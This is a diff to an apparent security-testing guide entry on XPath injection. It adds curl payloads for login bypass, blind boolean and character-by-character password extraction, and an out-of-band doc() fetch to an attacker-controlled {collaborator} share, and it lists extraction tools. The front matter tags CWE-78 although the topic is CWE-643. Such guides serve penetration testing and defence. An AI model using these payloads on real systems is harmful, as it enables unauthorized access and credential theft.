@@ -11,7 +11,8 @@ cwe_ids: [CWE-78]
 chains_with: [wstg-inpv-05, wstg-conf-05]
 prerequisites: [wstg-info-01, wstg-info-06]
 severity_boost:
-  wstg-inpv-05: "Command Injection + SQLi = Full System Compromise (Critical)"
+  wstg-inpv-05: "XPath Injection authentication bypass grants unauthenticated access to the login flow; when the same application also exposes a SQL-backed data store reachable post-bypass, the attacker pivots from XML auth bypass to full SQL Injection database compromise = Critical (Full System Compromise)"
+  wstg-conf-05: "XPath Injection auth bypass applied against a discovered admin interface grants immediate administrative control without valid credentials = Critical (Full Admin Takeover)"
 ---
 
 # wstg-inpv-09
@@ -308,6 +309,43 @@ normalize-space(//user[1]/password)
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# Auth bypass probe
+curl -s -X POST "https://{target}/login" -d "username=' or '1'='1" -d "password=' or '1'='1"
+
+# Blind boolean comparison (true vs false condition)
+curl -s -X POST "https://{target}/login" -d "username=' or count(//*)>0 or ''='" -d "password=x"
+curl -s -X POST "https://{target}/login" -d "username=' or count(//*)>999999 or ''='" -d "password=x"
+```
+
+| Payload | Technique | Detection Pattern |
+| --- | --- | --- |
+| `' or '1'='1` | Authentication bypass | 200 response with dashboard/welcome content |
+| `' or count(//*)>0 or ''='` | Boolean-based blind (true) | Response differs from the false-condition request |
+| `' or substring(//user[1]/password,1,1)='a' or ''='` | Character-by-character extraction | Response content/length differs per guessed character |
+| `admin'/*` | Comment-based bypass | Regex `XPathException\|XPath syntax error` in error output |
+
+### Node/Structure Enumeration and Out-of-Band Exfiltration
+
+```bash
+# Enumerate document structure without knowing node names
+curl -s -X POST "https://{target}/login" -d "username=' or count(/child::node())>0 or ''='" -d "password=x"
+curl -s -X POST "https://{target}/login" -d "username=x' or name()='username' or 'x'='y" -d "password=x"
+
+# Character extraction via codepoints-to-string (avoids quoting issues with special chars)
+curl -s -X POST "https://{target}/login" \
+  -d "username=' or substring(//user[1]/password,2,1)=codepoints-to-string(97) or ''='" -d "password=x"
+
+# Out-of-band via doc() to force the parser to fetch an attacker-controlled SMB/HTTP share
+curl -s "https://{target}/?title=Foundation&type=*&rent_days=* and doc('//{collaborator}/SHARE')"
+```
+
+Automated blind extraction tools: `orf/xcat`, `feakk/xxxpwn`, `micsoftvn/xpath-blind-explorer`.
+
+---
+
 ## Remediation
 
 ```java
@@ -371,6 +409,13 @@ $xpath = "//user[username='$username']";
 | ----------- | -------------------------------------------------------- |
 | **CWE-643** | Improper Neutralization of Data within XPath Expressions |
 
+
+---
+
+## References
+
+- [OWASP WSTG - WSTG-INPV-09: Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection)
+- [PayloadsAllTheThings - XPATH Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20injection)
 
 ---
 
